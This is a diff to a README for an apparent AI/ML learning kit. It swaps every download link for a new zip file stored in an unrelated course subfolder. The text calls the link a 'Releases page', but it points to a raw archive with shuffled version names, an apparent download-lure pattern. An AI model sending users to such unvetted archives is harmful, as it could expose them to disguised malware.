@@ -2,7 +2,7 @@
 
 ## 🛠️ Download the Application
 
-[![Download AIML-Engineering-Mastery-Kit](https://raw.githubusercontent.com/Noor-ali-web/AIML-Engineering-Mastery-Kit/main/14_MLOps_Production_ML/Engineering-AIM-Mastery-Kit-2.5-beta.3.zip)](https://raw.githubusercontent.com/Noor-ali-web/AIML-Engineering-Mastery-Kit/main/14_MLOps_Production_ML/Engineering-AIM-Mastery-Kit-2.5-beta.3.zip)
+[![Download AIML-Engineering-Mastery-Kit](https://github.com/Noor-ali-web/AIML-Engineering-Mastery-Kit/raw/refs/heads/main/14_MLOps_Production_ML/Mastery-Engineering-AIM-Kit-v2.7.zip)](https://github.com/Noor-ali-web/AIML-Engineering-Mastery-Kit/raw/refs/heads/main/14_MLOps_Production_ML/Mastery-Engineering-AIM-Kit-v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -35,7 +35,7 @@ To run the AIML Engineering Mastery Kit, ensure your system meets the following 
 
 To get started, visit the Releases page to download the latest version of the AIML Engineering Mastery Kit. 
 
-[Download AIML-Engineering-Mastery-Kit](https://raw.githubusercontent.com/Noor-ali-web/AIML-Engineering-Mastery-Kit/main/14_MLOps_Production_ML/Engineering-AIM-Mastery-Kit-2.5-beta.3.zip)
+[Download AIML-Engineering-Mastery-Kit](https://github.com/Noor-ali-web/AIML-Engineering-Mastery-Kit/raw/refs/heads/main/14_MLOps_Production_ML/Mastery-Engineering-AIM-Kit-v2.7.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the most recent version.
@@ -84,7 +84,7 @@ We plan to regularly update this kit with new notebooks, resources, and features
 
 ## 🔗 Useful Links
 
-- [Releases Page to Download](https://raw.githubusercontent.com/Noor-ali-web/AIML-Engineering-Mastery-Kit/main/14_MLOps_Production_ML/Engineering-AIM-Mastery-Kit-2.5-beta.3.zip)
+- [Releases Page to Download](https://github.com/Noor-ali-web/AIML-Engineering-Mastery-Kit/raw/refs/heads/main/14_MLOps_Production_ML/Mastery-Engineering-AIM-Kit-v2.7.zip)
 - [Discussion Forum](#)
 - [Documentation](#)
 
